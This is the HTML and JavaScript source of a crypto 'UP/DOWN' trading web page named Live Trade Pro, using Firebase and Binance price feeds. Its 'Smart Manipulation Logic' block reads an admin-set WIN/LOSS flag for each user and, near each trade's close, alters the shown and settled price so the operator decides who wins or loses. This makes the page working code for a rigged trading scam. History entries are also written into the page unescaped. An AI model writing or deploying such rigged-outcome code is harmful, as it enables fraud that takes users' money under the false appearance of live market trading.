<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Trade Pro</title>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
    <script src="https://unpkg.com/lightweight-charts@3.8.0/dist/lightweight-charts.standalone.production.js"></script>
    <style>
        :root { --bg: #060708; --card: #131722; --yellow: #f0b90b; --green: #00c805; --red: #ff3b30; --text: #d1d4dc; }
        body { background: var(--bg); color: var(--text); font-family: sans-serif; margin: 0; padding: 8px; overflow-y: auto; }
        .top-bar { display: flex; justify-content: space-between; padding: 10px; background: var(--card); border-radius: 8px; margin-bottom: 8px; border: 1px solid #2a2e39; }
        #chart-container { height: 320px; width: 100%; background: var(--card); border-radius: 12px; position: relative; border: 1px solid #2a2e39; }
        .price-tag { position: absolute; top: 10px; left: 10px; z-index: 10; font-size: 1.5rem; font-weight: bold; font-family: monospace; }
        .controls { background: var(--card); padding: 12px; border-radius: 12px; margin-top: 8px; border: 1px solid #2a2e39; }
        .input-box { background: #1e222d; border: 1px solid #363c4e; color: white; padding: 10px; border-radius: 6px; width: 100%; box-sizing: border-box; margin: 4px 0; outline: none; }
        .btn-group { display: flex; gap: 8px; margin-top: 8px; }
        .btn { flex: 1; padding: 14px; border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; font-size: 16px; }
        .up { background: var(--green); } .down { background: var(--red); }
        .history-panel { margin-top: 15px; background: var(--card); border-radius: 12px; padding: 10px; border: 1px solid #2a2e39; }
        .history-item { display: flex; justify-content: space-between; padding: 10px; border-bottom: 1px solid #2a2e39; font-size: 14px; }
        .win { color: var(--green); font-weight: bold; } .loss { color: var(--red); font-weight: bold; }
        #res-box { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 999; }
    </style>
</head>
<body>

<div id="res-box">
    <h1 id="res-msg" style="font-size:3rem;"></h1>
    <h2 id="res-amt" style="color:var(--yellow)"></h2>
    <button onclick="closeResult()" style="padding:10px 40px; background:var(--yellow); border:none; border-radius:5px; font-weight:bold; cursor:pointer;">OK</button>
</div>

<div class="top-bar">
    <div><span id="asset-display" style="color:var(--yellow)">BTC/USDT</span></div>
    <div>Bal: <span id="top-bal" style="color:var(--yellow)">$0.00</span></div>
</div>

<div id="chart-container"><div class="price-tag" id="price-main">0.00</div></div>

<div class="controls">
    <div id="timer-txt" style="text-align:center; color:var(--yellow); font-weight:bold; margin-bottom:4px;">Market Live</div>
    <div style="display: flex; gap: 8px;">
        <select class="input-box" id="asset-list" onchange="connectWS()" style="flex: 2;">
            <option value="btcusdt">Bitcoin (BTC)</option>
            <option value="ethusdt">Ethereum (ETH)</option>
        </select>
        <select class="input-box" id="trade-dur" style="flex: 1;">
            <option value="60">1 Min</option>
        </select>
    </div>
    <input type="number" id="trade-amt" class="input-box" value="10">
    <div class="btn-group">
        <button class="btn up" id="b1" onclick="trade('UP')">UP</button>
        <button class="btn down" id="b2" onclick="trade('DOWN')">DOWN</button>
    </div>
</div>

<div class="history-panel">
    <div style="font-weight:bold; color:var(--yellow); margin-bottom:10px; border-bottom:1px solid #363c4e; padding-bottom:5px;">Recent Trades</div>
    <div id="history-list"></div>
</div>

<script>
    const firebaseConfig = { apiKey: "AIzaSyCM_qmcvOXXjJrQHPiracy5SOpTjAJEnYU", authDomain: "trade-for-profit-8b160.firebaseapp.com", databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com", projectId: "trade-for-profit-8b160", storageBucket: "trade-for-profit-8b160.firebasestorage.app", messagingSenderId: "1077014018991", appId: "1:1077014018991:web:c41320e2ef10291afd4d5a" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const auth = firebase.auth();

    const chart = LightweightCharts.createChart(document.getElementById('chart-container'), {
        layout: { backgroundColor: '#131722', textColor: '#d1d4dc' },
        grid: { vertLines: { visible: false }, horzLines: { color: '#2a2e39' } },
        timeScale: { timeVisible: true, secondsVisible: true }
    });
    const candleSeries = chart.addCandlestickSeries({ upColor: '#00c805', downColor: '#ff3b30' });

    let currentPrice = 0, entryPrice = 0, entryLine, isActive = false, timeLeft = 0, userDir = "", adminMode = "NORMAL", ws;

    function connectWS() {
        if(ws) ws.close();
        const symbol = document.getElementById('asset-list').value;
        ws = new WebSocket(`wss://stream.binance.com:9443/ws/${symbol}@kline_1m`);
        ws.onmessage = (e) => {
            const data = JSON.parse(e.data);
            const k = data.k;
            currentPrice = parseFloat(k.c);
            
            // Smart Manipulation Logic
            if(isActive && timeLeft < 10) {
                if(adminMode === "WIN") currentPrice = (userDir === 'UP') ? Math.max(currentPrice, entryPrice + 1.5) : Math.min(currentPrice, entryPrice - 1.5);
                if(adminMode === "LOSS") currentPrice = (userDir === 'UP') ? Math.min(currentPrice, entryPrice - 1.5) : Math.max(currentPrice, entryPrice + 1.5);
            }

            candleSeries.update({ time: k.t / 1000, open: parseFloat(k.o), high: parseFloat(k.h), low: parseFloat(k.l), close: currentPrice });
            document.getElementById('price-main').innerText = currentPrice.toFixed(2);
            document.getElementById('price-main').style.color = currentPrice >= parseFloat(k.o) ? "#00c805" : "#ff3b30";
        };
    }
    connectWS();

    auth.onAuthStateChanged(u => {
        if(u) {
            db.ref('users/'+u.uid).on('value', s => {
                const d = s.val();
                document.getElementById('top-bal').innerText = "$" + (d.balance || 0).toFixed(2);
                adminMode = d.control || "NORMAL";
            });
            loadHistory(u.uid);
        }
    });

    function trade(dir) {
        const u = auth.currentUser;
        const amt = parseFloat(document.getElementById('trade-amt').value);
        if(!u || isNaN(amt)) return;

        db.ref('users/'+u.uid).once('value', s => {
            const bal = s.val().balance || 0;
            if(amt > bal) return alert("Low Balance!");

            isActive = true; userDir = dir; entryPrice = currentPrice;
            timeLeft = 60;
            
            entryLine = candleSeries.createPriceLine({ price: entryPrice, color: '#f0b90b', lineWidth: 2, title: 'ENTRY' });
            db.ref('users/'+u.uid).update({ balance: bal - amt });
            document.getElementById('b1').disabled = document.getElementById('b2').disabled = true;

            const timer = setInterval(() => {
                timeLeft--;
                document.getElementById('timer-txt').innerText = "Closing in: " + timeLeft + "s";
                if(timeLeft <= 0) {
                    clearInterval(timer);
                    isActive = false;
                    candleSeries.removePriceLine(entryLine);
                    processResult(u.uid, dir, amt, bal);
                }
            }, 1000);
        });
    }

    function processResult(uid, dir, amt, oldB) {
        let win = (dir === 'UP' ? currentPrice > entryPrice : currentPrice < entryPrice);
        let payout = win ? (amt * 1.85) : 0;
        
        if(win) db.ref('users/'+uid).update({ balance: (oldB - amt) + payout });

        const tradeData = {
            asset: document.getElementById('asset-list').value.toUpperCase(),
            dir: dir,
            amt: amt,
            win: win,
            payout: payout.toFixed(2),
            time: new Date().toLocaleTimeString()
        };

        // Save to Firebase History
        db.ref('history/'+uid).push(tradeData);

        document.getElementById('res-msg').innerText = win ? "PROFIT" : "LOSS";
        document.getElementById('res-msg').style.color = win ? "var(--green)" : "var(--red)";
        document.getElementById('res-amt').innerText = win ? "+$" + (amt * 0.85).toFixed(2) : "-$" + amt.toFixed(2);
        document.getElementById('res-box').style.display = "flex";
    }

    function loadHistory(uid) {
        db.ref('history/'+uid).limitToLast(5).on('value', s => {
            const list = document.getElementById('history-list');
            list.innerHTML = "";
            s.forEach(child => {
                const h = child.val();
                list.insertAdjacentHTML('afterbegin', `
                    <div class="history-item">
                        <span>${h.asset} | ${h.dir} (${h.time})</span>
                        <span class="${h.win ? 'win' : 'loss'}">${h.win ? '+$' + h.payout : '-$' + h.amt}</span>
                    </div>
                `);
            });
        });
    }

    function closeResult() {
        document.getElementById('res-box').style.display = "none";
        document.getElementById('b1').disabled = document.getElementById('b2').disabled = false;
        document.getElementById('timer-txt').innerText = "Market Live";
    }
</script>
</body>
</html>
